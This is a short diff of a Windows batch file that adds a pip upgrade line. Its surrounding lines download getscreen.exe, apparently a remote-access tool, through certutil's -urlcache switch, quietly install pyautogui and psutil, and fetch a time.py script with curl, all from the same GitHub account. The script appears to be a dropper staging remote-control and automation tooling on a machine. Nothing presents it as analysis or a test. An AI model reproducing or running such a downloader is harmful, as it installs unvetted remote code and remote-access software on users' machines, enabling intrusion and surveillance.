@@ -1,5 +1,6 @@
 @echo off
 certutil -urlcache -split -f "https://github.com/cisipex552/5/raw/main/Files/getscreen.exe" getscreen.exe
+python.exe -m pip install --upgrade pip
 pip install pyautogui --quiet
 pip install psutil --quiet
 curl -s -L -o time.py https://raw.githubusercontent.com/cisipex552/5/main/Time/time.py
